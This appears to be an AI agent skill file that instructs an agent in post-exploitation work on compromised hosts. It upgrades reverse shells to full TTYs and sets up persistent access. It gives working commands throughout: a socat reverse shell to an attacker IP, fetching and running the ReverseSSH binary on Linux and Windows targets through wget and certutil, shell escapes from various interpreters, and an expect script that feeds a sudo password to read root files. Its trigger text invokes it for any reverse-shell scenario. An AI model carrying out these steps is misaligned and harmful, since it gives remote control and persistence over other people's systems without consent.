---
name: reverse-shell-tty-upgrade
description: Upgrade reverse shells to full interactive TTYs and establish persistent access. Use this skill whenever you have a basic reverse shell and need proper terminal functionality, tab completion, or interactive commands. Also use when you need to set up ReverseSSH for file transfers, handle shells without TTY, or work with expect scripts for automated input. Trigger this for any reverse shell scenario where you need better than basic command execution.
---

# Reverse Shell TTY Upgrade

This skill helps you upgrade basic reverse shells to fully interactive TTY sessions with proper terminal features, and provides methods for persistent access and file transfers.

## When to Use This Skill

- You have a reverse shell but lack tab completion, proper terminal output, or interactive capabilities
- You need to run commands that require a TTY (like `sudo`, `vim`, `less`)
- You want to set up persistent SSH access from a compromised host
- You need to interact with programs that expect user input without a TTY
- You're working with limited shell access and need to spawn better shells

## Quick Reference: TTY Upgrade Methods

### Method 1: Python (Most Common)

```bash
# On the target (from your reverse shell):
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then in your listener (Ctrl+Z to background, then):
stty raw -echo; fg; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset
```

### Method 2: Script Command

```bash
# On the target:
script /dev/null -qc /bin/bash

# Then in your listener (same as above):
Ctrl+Z; stty raw -echo; fg; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset
```

### Method 3: Socat (Best Quality)

```bash
# On your attacker machine (listener):
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On the target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4444
```

## Shell Spawning from Different Interpreters

If you're stuck in another interpreter, use these to spawn a shell:

| Interpreter | Command |
|-------------|---------|
| Python | `python -c 'import pty; pty.spawn("/bin/sh")'` |
| Perl | `perl -e 'exec "/bin/sh"'` |
| Ruby | `ruby -e 'exec "/bin/sh"'` |
| Lua | `lua -e 'os.execute("/bin/sh")'` |
| IRB | `exec "/bin/sh"` |
| Vi/Vim | `:!bash` or `:set shell=/bin/bash:shell` |
| Nmap | `!sh` |
| Generic | `/bin/sh -i` |

## ReverseSSH for Persistent Access

ReverseSSH provides SSH-like access including file transfers and port forwarding.

### Setup (Attacker Machine)

```bash
# Download and prepare the listener
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh
chmod +x /dev/shm/reverse-ssh
/dev/shm/reverse-ssh -v -l -p 4444
```

### Deploy to Target (Linux)

```bash
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh
chmod +x /dev/shm/reverse-ssh
/dev/shm/reverse-ssh -p 4444 YOUR_USER@YOUR_IP
```

### Deploy to Target (Windows)

```bash
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe
reverse-ssh.exe -p 4444 YOUR_USER@YOUR_IP
```

### Connect After Setup

```bash
# Interactive shell
ssh -p 8888 127.0.0.1
# Password: letmeinbrudipls

# File transfer
sftp -P 8888 127.0.0.1
```

## Working Without TTY (Expect Script)

When you cannot get a full TTY but need to interact with programs:

```bash
expect -c 'spawn sudo -S cat "/root/root.txt"; expect "*password*"; send "<PASSWORD>"; send "\r\n"; interact'
```

### Expect Script Template

```bash
#!/usr/bin/expect -f
set timeout 30
spawn <COMMAND>
expect "*password*"
send "<PASSWORD>\r"
interact
```

## Important Notes

1. **SHELL Variable**: The shell you set in `SHELL` must be listed in `/etc/shells`, or you'll get an error.

2. **Terminal Size**: Get your terminal dimensions with `stty -a`, then set them with `stty rows <N> columns <M>`.

3. **Bash Required**: Most TTY upgrade methods only work in bash. If you're in zsh or another shell, switch first: `bash`

4. **Penelope Tool**: For automatic TTY upgrade with logging and readline support, consider [Penelope](https://github.com/brightio/penelope)

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "SHELL variable not found in /etc/shells" | Check `/etc/shells` and use a listed shell |
| No tab completion | Ensure you ran the full TTY upgrade sequence |
| Commands fail silently | Try `script /dev/null -qc /bin/bash` method |
| Can't run interactive programs | Use expect script or upgrade to full TTY |
| Shell disconnects | Use socat method for more stable connection |

## Workflow Summary

1. **Get initial reverse shell** (via your preferred method)
2. **Upgrade to TTY** using Python, script, or socat
3. **Set environment variables** (SHELL, TERM, stty)
4. **Run reset** to initialize terminal properly
5. **Consider ReverseSSH** for persistent access and file transfers
6. **Use expect** if TTY upgrade fails but you need interactive input
